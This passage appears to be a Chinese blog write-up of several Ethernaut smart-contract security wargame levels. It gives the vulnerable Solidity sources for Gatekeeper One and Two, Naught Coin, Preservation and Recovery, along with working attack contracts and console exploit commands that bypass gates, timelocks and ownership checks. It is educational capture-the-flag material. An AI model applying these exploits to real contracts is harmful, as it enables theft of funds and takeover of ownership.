^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h3><p><code>EVM</code> 虚拟机是一个256位的机器，所以它的一个存储位是 <code>32</code> 个字节，常量不存储，仅在代码中可用。当变量所占空间小于 <code>32</code> 字节且如果加上后面的变量也不超过 <code>32</code> 字节的话，则会与后面的变量共享空间。</p>
<p><a href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925">How to read Ethereum contract storage</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">bool public locked = <span class="literal">true</span>;								<span class="comment">// 1字节</span></span><br><span class="line">uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;			<span class="comment">// 32字节</span></span><br><span class="line">uint8 private flattening = <span class="number">10</span>;						<span class="comment">// 1字节</span></span><br><span class="line">uint8 private denomination = <span class="number">255</span>;					<span class="comment">// 1字节</span></span><br><span class="line">uint16 private awkwardness = <span class="title function_">uint16</span>(now);	<span class="comment">// 2字节</span></span><br><span class="line">bytes32[<span class="number">3</span>] private data;									<span class="comment">// 32*3字节</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">0</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000061b41d10</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">2</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x000000000000000000000000000000000000000000000000000000001d10ff0a</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">3</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x044d379b78a8d339346bbe58117dfbf39f31c4b26b7aea6414e01c1a5aa0a3cd</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">4</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x5e9b0400a5a6b65012c151e1142cc934df2444db82348cb7a96df88e1a03aee8</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">5</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0xdafa095e2a73eadf05b9ba9325c859ec1a3263470c07f5f16f62e7f30a9ee794</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">6</span> ,<span class="keyword">function</span>(<span class="params">err,res</span>)&#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(res)&#125;)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>

<p>所以<code>data[2]</code>是<code>web3.eth.getStorageAt(instance, 5 ,function(err,res)&#123;console.info(res)&#125;)</code>的结果, <code>bytes16()</code> 其实就是切片，取前 <code>16</code> 个 字节。</p>
<p><code>contract.unlock(&quot;0xdafa095e2a73eadf05b9ba9325c859ec1a3263470c07f5f16f62e7f30a9ee794&quot;.substring(0,34))</code></p>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p>Things that might help:</p>
<ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html">here</a> and <a href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls">here</a>).</li>
</ul>
<h3 id="Sources-12"><a href="#Sources-12" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution"></a>Solution</h3><p>需要满足3个<code>modifier</code></p>
<ul>
<li><p><code>gateOne()</code></p>
<p>同<a href="./#Telephone">Telephone</a></p>
</li>
<li><p><code>gateTwo()</code></p>
<p>在Remix的Javascript VM环境下部署<code>GatekeeperOneAttack</code>然后进入调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line"></span><br><span class="line">  constructor(address GatekeeperOneContractAddress) public &#123;</span><br><span class="line">    bytes memory encodedParams = abi.encodeWithSignature((&quot;enter(bytes8)&quot;),</span><br><span class="line">      0x0000000000000000</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    address(GatekeeperOneContractAddress).call&#123;gas: 81910&#125;(encodedParams);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211211214345867.png" alt="image-20211211214345867"></p>
<p>调用<code>enter</code>函数时传入了81910 gas，到执行<code>gasleft()</code>函数前还剩81661 gas，<code>gasleft()</code>函数本身消耗2 gas，所以我们应该传入的gas为<code>n*8191+(81910-81661+2)</code></p>
</li>
<li><p><code>gateThree(bytes8 _gateKey)</code></p>
<ul>
<li><p><code>uint32(uint64(_gateKey)) == uint16(tx.origin)</code></p>
<p>让<code>_gateKey</code>等于<code>bytes8(uint64(tx.origin))&amp;0xFFFFFFFFFF00FFFF</code>即可</p>
</li>
<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>
<p><code>_gateKey</code>前4个字节不为0即可，可以<code>|0xFFFFFFFF00000000</code>来确保</p>
</li>
<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code></p>
<p>继续<code>&amp;0xFFFFFFFF00FFFFFF</code></p>
</li>
</ul>
</li>
</ul>
<p>综上<code>_gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF | 0xFFFFFFFF00000000;</code>    </p>
<p>设置好的gas在实际测试网中没成功，所以还是采用以下方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line"></span><br><span class="line">  constructor(address GatekeeperOneContractAddress) public &#123;</span><br><span class="line">    bytes8 _gateKey = bytes8(uint64(tx.origin)) &amp; 0xFFFFFFFF0000FFFF | 0xFFFFFFFF00000000;</span><br><span class="line">    </span><br><span class="line">    // NOTE: the proper gas offset to use will vary depending on the compiler</span><br><span class="line">    // version and optimization settings used to deploy the factory contract.</span><br><span class="line">    // To migitage, brute-force a range of possible values of gas to forward.</span><br><span class="line">    // Using call (vs. an abstract interface) prevents reverts from propagating.</span><br><span class="line">    bytes memory encodedParams = abi.encodeWithSignature((&quot;enter(bytes8)&quot;),</span><br><span class="line">      _gateKey</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">		// gas offset usually comes in around 210, give a buffer of 60 on each side</span><br><span class="line">    for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">      (bool result, ) = address(GatekeeperOneContractAddress).call&#123;gas: i + 150 + 8191 * 3&#125;(encodedParams);</span><br><span class="line">      if(result)</span><br><span class="line">        &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
<p>Things that might help:</p>
<ul>
<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html">here</a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a>.</li>
<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>
<h3 id="Sources-13"><a href="#Sources-13" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution"></a>Solution</h3><ul>
<li><p><code>gateThree(bytes8 _gateKey)</code></p>
<p><code>bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));</code></p>
</li>
<li><p><code>gateTwo()</code></p>
<p>参考<a href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a> 7.1</p>
<blockquote>
<p>7.1. Subtleties. Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code[5].<br>[5] During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).</p>
</blockquote>
<p>所以只要在构造函数中调用即可</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperTwoInterface &#123;</span><br><span class="line">  function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line"></span><br><span class="line">  GatekeeperTwoInterface gatekeeper;</span><br><span class="line"></span><br><span class="line">  constructor(address GatekeeperTwoContractAddress) public &#123;</span><br><span class="line">    gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress);</span><br><span class="line">    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));</span><br><span class="line">    gatekeeper.enter&#123;gas:50000&#125;(key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p> Things that might help</p>
<ul>
<li>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> Spec</li>
<li>The <a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin</a> codebase</li>
</ul>
<h3 id="Sources-14"><a href="#Sources-14" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution"></a>Solution</h3><p>需要清空自己的<code>balance</code>，但限制了时间，查看父合约<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol</a></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211212201420739.png" alt="image-20211212201420739"></p>
<p><code>transferFrom</code>方法也可转账，不过需要先调用<code>approve</code>函数给转账者额度，这里转账者也设为自己</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.approve(player,toWei(&quot;1000000&quot;))</span><br><span class="line">contract.transferFrom(player,ethernaut.address,toWei(&quot;1000000&quot;))</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211212210751357.png" alt="image-20211212210751357"></p>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
<li>Understanding how storage variables are stored and accessed.</li>
<li>Understanding how casting works between different data types.</li>
</ul>
<h3 id="Sources-15"><a href="#Sources-15" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-15"><a href="#Solution-15" class="headerlink" title="Solution"></a>Solution</h3><p>参考<a href="#Solution-5">Delegation</a>题目，使用<code>delegatecall</code>，状态变量的修改影响的是调用者。所以我们调用<code>Preservation</code>合约的<code>setFirstTime</code>或者<code>setSecondTime</code>方法时，实际修改的是<code>Preservation</code>合约的<code>timeZone1Library</code>变量</p>
<p>部署以下合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address slot0;</span><br><span class="line">  address slot1; </span><br><span class="line">  address ownerSlot;</span><br><span class="line"></span><br><span class="line">  function setTime(uint addressAsUint) public &#123;</span><br><span class="line">    // Sets the owner</span><br><span class="line">    ownerSlot = address(addressAsUint);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>Preservation</code>合约<code>setFirstTime</code>或者<code>setSecondTime</code>方法将<code>timeZone1Library</code>设置为恶意合约的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.setSecondTime(&quot;0x382dc9A1Ce05643c327729F18486A0CD656025BE&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211214232324430.png" alt="image-20211214232324430"></p>
<p>再次调用<code>setFirstTime</code>就是执行的恶意合约中的代码了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract.setFirstTime(player)</span><br></pre></td></tr></table></figure>

<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211214232817322.png" alt="image-20211214232817322"></p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.5</code> ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the <code>0.5</code> ether from the lost contract address.</p>
<h3 id="Sources-16"><a href="#Sources-16" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution-16"><a href="#Solution-16" class="headerlink" title="Solution"></a>Solution</h3><p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215213643538.png" alt="image-20211215213643538"></p>
<p>从题目实例拿到的是<code>Recovery</code>合约的地址，需要找到其创建的<code>SimpleToken</code>合约地址，转出其中的0.5 Ether</p>
<p>从交易信息就可以找回地址</p>
<p><a href="https://rinkeby.etherscan.io/address/0xf66c40756e06E352304b5FC9D316669175D518ED#internaltx">https://rinkeby.etherscan.io/address/0xf66c40756e06E352304b5FC9D316669175D518ED#internaltx</a></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215213925467.png" alt="image-20211215213925467"></p>
<p><img src="/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94Ethernaut/image-20211215214403004.png" alt="image-20211215214403004"></p>
<p>其实从<code>RecoveryFactory.sol</code>代码也可以看出来，创建的合约地址是可预测的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), recoveryInstance, uint8(0x01))))));</span><br></pre></td></tr></table></figure>

<p>参考<a href="https://learnblockchain.cn/2019/06/10/address-compute/">以太坊合约地址是怎么计算出来的？</a></p>
<p><a href="https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3">Ethernaut Lvl 18 Recovery Walkthrough: How to retrieve lost contract addresses (in 2 ways)</a></p>
<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><p>Difficulty 6&#x2F;10</p>
<p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
<p>Easy right? Well… there’s a catch.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
<p>Good luck!</p>
<h3 id="Sources-17"><a href="#Sources-17" class="headerlink" title="Sources"></a>Sources</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  